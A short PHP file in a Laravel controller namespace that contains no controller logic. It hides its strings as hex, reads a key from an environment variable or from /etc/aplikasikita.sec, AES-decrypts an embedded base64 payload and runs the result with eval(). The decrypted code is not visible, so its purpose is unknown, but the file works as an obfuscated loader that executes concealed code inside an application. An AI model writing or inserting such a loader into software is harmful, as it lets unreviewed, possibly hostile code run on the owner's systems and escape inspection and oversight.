<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('jvOjh0YREXtWIJKsqzx5pw==');

$c=base64_decode(

'YkQP/mW3EqiB68KVTWjhKK9FMplS+PLuqBhcO5gwnj3a2meiH8uiCvMvqXXEtvd9cSoVAGUGcC9S' .
'7WGrpH4s3qYpwBc8S+r6g1NJtvDaf+O793pUO/7/QVzW4EqLOlZlyI3303zDhTeRjudC5sKwqyJn' .
'H8bBB7kaKcBzq/8LJ/dl8AGhJhv6RX9+cQMqSddGrrCkDqWm3yYi6mmENrdGk8y+9m75tZ5FvSsw' .
'A8eTzhqp0imz/dYuRIR1AV21a5dP'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

